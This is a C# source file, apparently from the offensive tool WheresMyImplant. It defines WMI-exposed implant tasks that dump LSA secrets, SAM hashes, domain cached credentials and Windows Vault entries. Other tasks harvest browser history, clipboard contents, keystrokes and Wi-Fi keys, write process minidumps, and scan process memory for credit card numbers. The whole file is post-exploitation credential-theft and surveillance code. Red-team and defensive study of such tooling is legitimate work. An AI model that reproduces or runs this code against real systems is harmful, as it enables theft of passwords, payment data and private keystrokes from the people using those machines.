using System;
using System.Management.Instrumentation;
using System.Text;

namespace WheresMyImplant
{
    public partial class Implant
    {
        [ManagementTask]
        public static String DumpLsa()
        {
            StringBuilder output = new StringBuilder();
            CheckPrivileges checkSystem = new CheckPrivileges();
            String results = "";
            if (checkSystem.GetSystem())
            {
                LSASecrets lsaSecrets = new LSASecrets();
                lsaSecrets.DumpLSASecrets();
                results = lsaSecrets.GetOutput();
            }
            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpSAM()
        {
            StringBuilder output = new StringBuilder();
            CheckPrivileges checkSystem = new CheckPrivileges();
            String results = "";
            if (checkSystem.GetSystem())
            {
                SAM sam = new SAM();
                results = sam.GetOutput();
            }
            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpDomainCache()
        {
            StringBuilder output = new StringBuilder();
            CheckPrivileges checkSystem = new CheckPrivileges();
            String results = "";
            if (checkSystem.GetSystem())
            {
                CacheDump cacheDump = new CacheDump();
                results = cacheDump.GetOutput();
            }
            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpVault()
        {
            StringBuilder output = new StringBuilder();
            Vault vault = new Vault();
            vault.EnumerateCredentials();

            CheckPrivileges checkSystem = new CheckPrivileges();
            if (checkSystem.GetSystem())
            {
                vault = new Vault();
                vault.EnumerateCredentials();
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String DumpVaultCLI()
        {
            VaultCLI vault = new VaultCLI();
            vault.EnumerateVaults();
            return vault.GetOutput();
        }

        [ManagementTask]
        public static String DumpBrowserHistory()
        {
            BrowserHistory history = new BrowserHistory();
            history.InternetExplorer();
            history.Firefox();
            history.Chrome();
            return history.GetOutput();
        }

        [ManagementTask]
        public static String ReadProcessMemory(String processId)
        {
            StringBuilder output = new StringBuilder();
            Int32 pid;
            if (!Int32.TryParse(processId, out pid))
            {
                return output.ToString();
            }

            ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
            if (!readProcessMemory.OpenProcess())
            {
                return output.ToString();
            }
            readProcessMemory.ReadProcesMemory();
            output.Append(readProcessMemory.GetOutput());
            output.Append("\n-----\n");
            output.Append(CheckCCNumber(readProcessMemory.GetPrintableMemory()));
            return output.ToString();
        }

        [ManagementTask]
        public static String CheckCCNumber(String input)
        {
            StringBuilder output = new StringBuilder();
            foreach (String number in CheckCreditCard.CheckString(input))
            {
                output.Append(number);
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String MiniDump(String processId, String fileName)
        {
            StringBuilder output = new StringBuilder();
            Int32 pid;
            if (!Int32.TryParse(processId, out pid))
            {
                return output.ToString();
            }

            MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
            miniDump.CreateMiniDump((UInt32)pid, fileName);
            output.Append(miniDump.GetOutput());
            return output.ToString();
        }

        [ManagementTask]
        public static String Clipboard()
        {
            StringBuilder output = new StringBuilder();
            try
            {
                ClipboardManaged clipboard = new ClipboardManaged();
                clipboard.Execute();
                output.Append(clipboard.GetOutput());
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String Keylogger()
        {
            StringBuilder output = new StringBuilder();
            try
            {
                KeyLogger clipboard = new KeyLogger();
                clipboard.Execute();
                output.Append(clipboard.GetOutput());
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String WirelessPreSharedKey()
        {
            StringBuilder output = new StringBuilder();
            WirelessProfiles wp = new WirelessProfiles();
            wp.GetProfiles();
            output.Append(wp.GetOutput());
            return output.ToString();
        }
    }
}
